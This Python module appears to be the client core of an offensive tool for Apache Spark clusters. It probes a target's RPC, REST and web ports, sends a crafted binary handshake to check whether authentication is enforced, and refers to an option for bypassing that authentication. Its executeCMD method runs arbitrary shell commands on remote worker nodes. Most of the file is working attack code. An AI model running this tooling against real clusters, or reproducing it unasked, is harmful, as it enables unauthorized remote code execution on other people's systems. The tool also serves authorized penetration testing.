import pyspark
from utils.general import whine
import random, time
from lxml import html
import logging, errno, requests, json
import subprocess, os, struct, socket, sys


class SparkClient:
    def __init__(self, target, port, localIP, appName, username):
        self.target = target
        self.port = port
        self.restPort = 6066
        self.httpPort = 8080
        self.driverPort = 8080
        self.blockManagerPort = 8443
        self.logLevel = "WARN"
        self.localIP = localIP
        self.sc = None
        self.appName = appName
        self.username = username
        self.version = None
        self.secret = ""
        self.requiresAuthentication = False
        self.yarn = False
        self.hdfs = None
        self.conf = None

    def prepareConf(self, secret, pyBinary):
        os.environ["SPARK_LOCAL_IP"] = self.localIP
        os.environ["PYSPARK_PYTHON"] = pyBinary
        conf = pyspark.SparkConf().setAppName(self.appName)
        conf = conf.set("spark.local.ip", self.localIP)
        conf = conf.set("spark.driver.host", self.localIP)
        conf = conf.set("spark.driver.port", self.driverPort)
        conf = conf.set("spark.blockManager.port", self.blockManagerPort)
        if self.requiresAuthentication:
            conf = self._setupAuthentication(conf, secret)
        if self.yarn:
            conf = self._setupYarn(conf)
        else:
            conf = conf.setMaster("spark://%s:%d" % (self.target, self.port))

        conf = conf.set(
            "spark.driver.extraJavaOptions", "-Duser.name=%s" % self.username
        )
        self.conf = conf

    def _setupYarn(self, conf):
        os.environ["HADOOP_USER_NAME"] = "hadoop"
        os.environ["HADOOP_CONF_DIR"] = "./yarn"
        conf = conf.setMaster("yarn")
        conf = conf.set(
            "spark.hadoop.yarn.resourcemanager.address",
            "%s:%s" % (self.target, self.port),
        )
        conf = conf.set("spark.yarn.stagingDir", "/tmp")
        conf = conf.set("spark.hadoop.fs.defaultFS", "hdfs://%s" % self.hdfs)
        return conf

    def _setupAuthentication(self, conf, secret):
        self.secret = secret
        conf = conf.set("spark.authenticate", "true")
        conf = conf.set("spark.authenticate.secret", secret)
        return conf

    def _check_authentication(self):
        if self.requiresAuthentication and not len(self.secret):
            return False
        return True

    def _checkPyVersion(self):
        if sys.version_info[0] > 2 and os.environ["PYSPARK_PYTHON"] == "python":
            whine(
                "Spark workers running a different version than Python %s.%s will throw errors. See -P option"
                % (sys.version_info[0], sys.version_info[1]),
                "warn",
            )

    def _is_port_in_use(self, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = ("127.0.0.1", int(port))
        ret = sock.connect_ex(server_address)
        return int(ret) == 0

    def _checkListeningPorts(self):
        if self._is_port_in_use(self.driverPort) or self._is_port_in_use(
            self.blockManagerPort
        ):
            whine(
                "Make sure that both the driver port (-D) %s and block manager port (-B) %s are free to bind"
                % (self.driverPort, self.blockManagerPort),
                "err",
            )
            sys.exit(-1)

    def initContext(self):
        whine("Initializing local Spark driver...This can take a little while", "info")
        if self.conf is None:
            whine("Could not load Spark conf")
            sys.exit(-1)
        if not self._check_authentication():
            whine(
                "Spark is protected with authentication. Either provide a secret (-S) or add --blind option when executing a command to bypass authentication",
                "err",
            )
            sys.exit(-1)

        self._checkPyVersion()
        self._checkListeningPorts()
        self.sc = pyspark.SparkContext(conf=self.conf)
        self.sc.setLogLevel(self.logLevel)

    def isReady(self):
        if self.sc is None:
            return False
        return True

    def performWork(self):
        if not self.isReady():
            whine(
                "Pyspark driver is not initialized. Remove conflicting options (e.g -a)",
                "err",
            )
            sys.exit()
        self.sc.parallelize(range(0, 1), 10).filter(lambda x: x + 1).count()

    def listNodes(self):
        if not self.isReady():
            whine(
                "Pyspark driver is not initialized. Remove conflicting options (e.g -a)",
                "err",
            )
            sys.exit()
        self.performWork()
        return self.sc._jsc.sc().getExecutorMemoryStatus()

    def getAll(self):
        pysparkPath = pyspark.__path__[0]
        sparkSubmit = "%s/bin/spark-submit" % pysparkPath
        if self.yarn:
            sparkArgs = " --master yarn"
        else:
            sparkArgs = " --master spark://%s:%s" % (self.target, self.port)

        for tupleItems in self.conf.getAll():
            sparkArgs += ' --conf "%s=%s"' % (tupleItems[0], tupleItems[1])

        return sparkSubmit, sparkArgs

    def executeCMD(self, interpreterArgs, numWorkers=1):
        if not self.isReady():
            return None
        out = []
        mylist = self.sc.parallelize(range(0, numWorkers), numWorkers).map(
            lambda x: subprocess.Popen(
                interpreterArgs, stdout=subprocess.PIPE
            ).stdout.read()
        )
        for a in mylist.collect():
            out.append(a)
        return out

    def sendHello(self):
        if self.yarn:
            return True
        nonce = b"\x00\x00\x00\x00\x00\x00\x00\xc5\x03\x62\x05\x32\x92\xe7\xca\x6d\xaa\x00\x00\x00\xb0"
        hello = (
            b"\x01\x00\x0c\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x32\x31\x00"
            b"\x00\xe7\x44\x01\x00\x0c\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e"
            b"\x32\x38\x00\x00\x1b\xa5\x00\x11\x65\x6e\x64\x70\x6f\x69\x6e\x74"
            b"\x2d\x76\x65\x72\x69\x66\x69\x65\x72\xac\xed\x00\x05\x73\x72\x00"
            b"\x3d\x6f\x72\x67\x2e\x61\x70\x61\x63\x68\x65\x2e\x73\x70\x61\x72"
            b"\x6b\x2e\x72\x70\x63\x2e\x6e\x65\x74\x74\x79\x2e\x52\x70\x63\x45"
            b"\x6e\x64\x70\x6f\x69\x6e\x74\x56\x65\x72\x69\x66\x69\x65\x72\x24"
            b"\x43\x68\x65\x63\x6b\x45\x78\x69\x73\x74\x65\x6e\x63\x65\x6c\x19"
            b"\x1e\xae\x8e\x40\xc0\x1f\x02\x00\x01\x4c\x00\x04\x6e\x61\x6d\x65"
            b"\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74"
            b"\x72\x69\x6e\x67\x3b\x78\x70\x74\x00\x06\x4d\x61\x73\x74\x65\x72"
        )
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_address = (self.target, self.port)
            sock.settimeout(3)
            sock.connect(server_address)
            sock.send(nonce)
            sock.send(hello)
            respNone = sock.recv(21)
            respNone2 = sock.recv(200)
            if "Expected SaslMessage" in respNone2.decode("utf-8", "ignore"):
                self.requiresAuthentication = True
            if len(respNone) == 21 and respNone[10] == nonce[10]:
                return True

        except socket.timeout:
            whine("Caught a timeout on target %s:%s" % (self.target, self.port), "err")
            sys.exit(-1)
        except Exception as serr:
            if serr.errno == errno.ECONNREFUSED:
                whine(serr, "err")
                sys.exit(-1)
            whine(serr, "warn")
            return False

    def sendRestHello(self):
        try:
            rp = requests.get(
                "http://%s:%s/v1/submissions/status/1" % (self.target, self.restPort),
                timeout=3,
            )
            jsonData = json.loads(rp.text)
            return jsonData
        except (requests.exceptions.Timeout, requests.exceptions.RequestException):
            whine(
                "No Rest API available at %s:%s" % (self.target, self.restPort), "warn"
            )
            return None
        except Exception as err:
            whine(
                "Error connecting to REST API at %s:%s - %s"
                % (self.target, self.restPort, err),
                "err",
            )
            return None

    def sendRestPost(self, url, jsonData, headers):
        try:
            rp = requests.post(url, timeout=3, headers=headers, json=jsonData)
            jsonResp = json.loads(rp.text)
            return jsonResp
        except (requests.exceptions.Timeout, requests.exceptions.RequestException):
            whine(
                "No Rest API available at %s:%s" % (self.target, self.restPort), "warn"
            )
            return None
        except Exception as err:
            whine(
                "Error connecting to REST API at %s:%s - %s"
                % (self.target, self.restPort, err),
                "err",
            )
            return None

    def sendHTTPHello(self):
        try:
            rp = requests.get("http://%s:%s" % (self.target, self.httpPort), timeout=3)
            doc = html.fromstring(rp.text)
            return doc
        except (requests.exceptions.Timeout, requests.exceptions.RequestException):
            whine(
                "No Web page available at %s:%s" % (self.target, self.httpPort), "warn"
            )
            return None
        except Exception as err:
            whine(
                "Error connecting to Web page at %s:%s - %s"
                % (self.target, self.httpPort, err),
                "err",
            )
            return None

    def sendRawMessage(self, nonce, payload, sock=None, wait_time=2):
        try:
            if sock is None:
                server_address = (self.target, self.port)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect(server_address)
            sock.send(nonce)
            sock.send(payload)
            respNone = sock.recv(13)
            time.sleep(0.5)
            realResp = sock.recv(2048)
            time.sleep(wait_time)
            return realResp
        except socket.timeout:
            whine("Caught a timeout on target %s:%s" % (self.target, self.port), "err")
            return None
        except Exception as serr:
            if serr.errno == errno.ECONNREFUSED:
                whine(serr, "err")
                sys.exit(-1)
            whine(serr, "warn")
            return None
        return None

    def __del__(self):
        os.environ["SPARK_LOCAL_IP"] = ""
